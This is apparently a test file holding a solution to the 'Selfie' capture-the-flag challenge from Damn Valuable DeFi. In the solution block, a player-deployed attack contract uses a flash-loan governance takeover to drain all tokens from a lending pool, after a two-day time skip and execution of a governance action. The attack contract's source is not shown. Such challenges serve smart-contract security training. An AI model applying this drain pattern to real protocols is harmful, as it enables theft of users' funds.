import { ethers } from 'hardhat';
import { expect } from 'chai';
import { time } from '@nomicfoundation/hardhat-network-helpers';

describe('[Challenge] Selfie', function () {
  it('should take all the tokens', async function () {
    const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
    const TOKENS_IN_POOL = 1500000n * 10n ** 18n;

    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    const [deployer, player] = await ethers.getSigners();

    // Deploy Damn Valuable Token Snapshot
    const token = await (
      await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer)
    ).deploy(TOKEN_INITIAL_SUPPLY);

    // Deploy governance contract
    const governance = await (await ethers.getContractFactory('SimpleGovernance', deployer)).deploy(token);
    expect(await governance.getActionCounter()).to.eq(1);

    // Deploy the pool
    const pool = await (await ethers.getContractFactory('SelfiePool', deployer)).deploy(token, governance);
    expect(await pool.token()).to.eq(token);
    expect(await pool.governance()).to.eq(governance);

    // Fund the pool
    await token.transfer(pool, TOKENS_IN_POOL);
    await token.snapshot();
    expect(await token.balanceOf(pool)).to.be.equal(TOKENS_IN_POOL);
    expect(await pool.maxFlashLoan(token)).to.eq(TOKENS_IN_POOL);
    expect(await pool.flashFee(token, 0)).to.eq(0);

    /** CODE YOUR SOLUTION HERE */
    const attack = await ethers.deployContract('SelfieAttack', [pool, governance], player);
    await attack.attack();
    await time.increase(2 * 24 * 60 * 60);
    await governance.executeAction(1);

    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player)).to.be.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool)).to.be.equal(0);
  });
});
